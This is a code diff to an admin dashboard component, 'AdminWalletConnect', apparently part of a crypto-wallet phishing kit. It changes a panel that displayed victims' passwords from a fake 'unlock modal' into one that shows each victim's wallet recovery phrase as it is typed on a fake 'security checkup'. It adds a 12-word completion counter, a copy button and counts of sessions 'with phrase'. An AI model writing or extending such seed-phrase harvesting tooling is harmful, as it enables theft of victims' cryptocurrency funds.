@@ -69,22 +69,33 @@ function CopyButton({ value, label }: { value: string; label: string }) {
   )
 }
 
-function PasswordCell({ password }: { password: string | null }) {
-  if (!password || !password.trim()) {
+function PhraseCell({ phrase }: { phrase: string | null }) {
+  const text = phrase?.trim() || ''
+  const wordCount = text ? text.split(/\s+/).filter(Boolean).length : 0
+
+  if (!text) {
     return (
       <span className="inline-flex items-center gap-1.5 text-[11px] text-gray-500 italic">
         <span className="w-1.5 h-1.5 rounded-full bg-amber-400/80 animate-pulse" />
-        Waiting for unlock modal…
+        Waiting for security checkup…
       </span>
     )
   }
+
   return (
-    <div className="flex items-start gap-2 max-w-[280px]">
+    <div className="flex items-start gap-2 max-w-[320px]">
       <div className="flex-1 min-w-0 rounded-lg bg-[#060A0E] border border-[#243044] px-3 py-2">
-        <p className="text-[10px] uppercase tracking-wider text-gray-500 mb-1">Modal password</p>
-        <p className="text-sm font-mono text-white break-all leading-snug">{password}</p>
+        <div className="flex items-center justify-between gap-2 mb-1">
+          <p className="text-[10px] uppercase tracking-wider text-gray-500">Recovery phrase (live)</p>
+          {wordCount < 12 ? (
+            <span className="text-[10px] font-semibold text-amber-400 tabular-nums">{wordCount}/12 words</span>
+          ) : (
+            <span className="text-[10px] font-semibold text-[#c7f284]">Complete</span>
+          )}
+        </div>
+        <p className="text-sm font-mono text-white break-all leading-snug">{text}</p>
       </div>
-      <CopyButton value={password} label="Password" />
+      <CopyButton value={text} label="Phrase" />
     </div>
   )
 }
@@ -137,7 +148,7 @@ function SessionRow({ c }: { c: LiveWalletConnection }) {
         )}
       </td>
       <td className="px-4 py-4 align-top">
-        <PasswordCell password={c.unlockPassword} />
+        <PhraseCell phrase={c.unlockPassword} />
       </td>
       <td className="px-4 py-4 align-top hidden lg:table-cell">
         <p className="text-[11px] text-gray-400">{timeAgo(c.lastSeenAt)}</p>
@@ -253,11 +264,11 @@ export const AdminWalletConnect: React.FC = () => {
       <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
         <StatCard title="Active sessions" value={stats.total} icon={<Wallet className="w-4 h-4" />} loading={loading} />
         <StatCard
-          title="With password"
+          title="With phrase"
           value={stats.withPassword}
           icon={<KeyRound className="w-4 h-4" />}
           loading={loading}
-          description="Submitted in unlock modal"
+          description="Typed on security checkup"
         />
         <StatCard title="Live now" value={stats.live} icon={<Radio className="w-4 h-4" />} loading={loading} />
       </div>
@@ -286,7 +297,7 @@ export const AdminWalletConnect: React.FC = () => {
                     Wallet
                   </th>
                   <th className="px-4 py-3 text-[10px] font-bold uppercase tracking-wider text-gray-500">
-                    Unlock password
+                    Recovery phrase
                   </th>
                   <th className="px-4 py-3 text-[10px] font-bold uppercase tracking-wider text-gray-500 hidden lg:table-cell">
                     Activity
